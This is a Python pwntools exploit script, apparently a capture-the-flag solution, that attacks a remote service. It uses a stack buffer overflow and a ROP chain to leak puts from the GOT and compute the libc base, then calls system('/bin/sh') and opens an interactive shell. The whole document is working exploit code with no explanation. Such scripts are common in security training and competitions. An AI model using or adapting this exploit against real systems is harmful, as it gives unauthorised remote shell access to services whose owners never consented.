from pwn import *


# p = process('./classic')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = remote('141.85.224.109', 51559)
libc = ELF('./libc.so.6')

pad = 0x30 + 8
pop_rdi_ret = 0x400773
ret = 0x400285
puts_plt = 0x400520
puts_got = 0x601018
main_addr = 0x400647
payload1 = pad * b'a' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

p.sendline(payload1)
p.recvline()
p.recvline()

puts_addr = u64(p.recvline().rstrip() + b'\x00\x00')
libc.address = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))

payload2 = pad * b'a' + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload2)

p.interactive()
